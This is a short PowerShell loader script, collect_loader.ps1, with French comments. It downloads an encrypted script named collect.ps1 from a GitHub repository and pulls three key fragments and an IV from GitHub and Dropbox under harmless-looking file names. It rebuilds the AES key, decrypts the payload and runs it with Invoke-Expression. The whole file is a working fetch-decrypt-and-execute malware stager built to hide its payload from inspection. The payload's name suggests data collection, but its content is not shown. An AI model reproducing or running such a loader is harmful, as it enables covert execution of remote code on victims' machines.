Write-Host "[*] collect_loader.ps1 : téléchargement et déchiffrement de collect.ps1..."

# --- Liens raw GitHub + Dropbox pour collect.ps1 chiffré et ses fragments ---
$links = @{
    "enc" = "https://raw.githubusercontent.com/m1d0b4n/j4g4n/refs/heads/main/e_data/c.m1d0b4n"
    "c1"  = "https://raw.githubusercontent.com/m1d0b4n/j4g4n/refs/heads/main/e_data/c_config_1.txt"
    "c2"  = "https://raw.githubusercontent.com/m1d0b4n/j4g4n/refs/heads/main/e_data/c_config_2.txt"
    "c3"  = "https://www.dropbox.com/scl/fi/zebskodmwmsak01fgg0a2/c_config_3.txt?rlkey=ef3mkyrqpe5bb7y6i0198kjxr&st=ejgf3q6h&dl=1"
    "iv"  = "https://raw.githubusercontent.com/m1d0b4n/j4g4n/refs/heads/main/e_data/c_i_theme.txt"
}

function Get-RemoteContent($url) {
    return Invoke-RestMethod -Uri $url
}

$frag1 = [Convert]::FromBase64String((Get-RemoteContent $links.c1))
$frag2 = [Convert]::FromBase64String((Get-RemoteContent $links.c2))
$frag3 = [Convert]::FromBase64String((Get-RemoteContent $links.c3))
$iv    = [Convert]::FromBase64String((Get-RemoteContent $links.iv))

$key = New-Object byte[] ($frag1.Length + $frag2.Length + $frag3.Length)
[Array]::Copy($frag1, 0, $key, 0, $frag1.Length)
[Array]::Copy($frag2, 0, $key, $frag1.Length, $frag2.Length)
[Array]::Copy($frag3, 0, $key, $frag1.Length + $frag2.Length, $frag3.Length)

$enc_b64 = Get-RemoteContent $links.enc
$enc_bytes = [Convert]::FromBase64String($enc_b64)

$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$aes.Key = $key
$aes.IV = $iv
$decryptor = $aes.CreateDecryptor()
$plain_bytes = $decryptor.TransformFinalBlock($enc_bytes, 0, $enc_bytes.Length)
$aes.Dispose()
$plain = [System.Text.Encoding]::UTF8.GetString($plain_bytes)

# --- Exécution dynamique du script PowerShell déchiffré (collect.ps1) ---
Invoke-Expression $plain

Write-Host "[+] collect.ps1 déchiffré et exécuté."
